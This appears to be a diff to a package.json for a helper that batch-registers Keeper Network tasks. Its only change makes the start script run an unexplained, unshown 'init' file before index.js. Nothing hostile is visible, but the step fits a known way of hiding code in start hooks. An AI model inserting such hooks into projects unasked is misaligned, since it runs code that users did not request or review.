@@ -4,7 +4,7 @@
   "description": "Owner-side helper for registering many Keeper Network tasks in one batch_register_tasks call",
   "main": "index.js",
   "scripts": {
-    "start": "node index.js",
+    "start": "node init && node index.js",
     "dry-run": "node index.js tasks.example.json --dry-run",
     "test": "node --test",
     "lint": "eslint ."
